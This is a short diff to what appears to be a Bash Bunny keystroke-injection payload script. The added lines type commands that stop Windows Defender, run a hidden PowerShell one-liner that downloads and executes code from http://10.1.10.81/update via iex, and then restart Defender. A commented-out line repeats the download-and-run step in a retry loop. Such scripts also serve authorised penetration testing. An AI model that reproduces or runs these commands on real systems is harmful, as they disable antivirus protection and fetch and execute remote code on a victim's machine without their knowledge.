@@ -25,10 +25,16 @@ Q DELAY 500
 LED SPECIAL2
 #Powershell Payload: first wait for connection to bunny webserver, then run network config
 #Quotes may need to be escaped
+Q STRING sc stop WinDefend
+Q ENTER
+
 Q STRING "powershell.exe -nop -W Hidden -C \"iex (new-object net.webclient).downloadstring('http://10.1.10.81/update')\""
 #Q STRING "Start-Sleep -Seconds 15 ; while (\$true) {If (Test-Connection 10.1.10.81 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://10.1.10.81/update')}}"
 Q ENTER
+
+LED STAGE3
+Q STRING sc start WinDefend
+Q ENTER
 Q DELAY 300
 
-#Q DELAY 5000
 LED FINISH
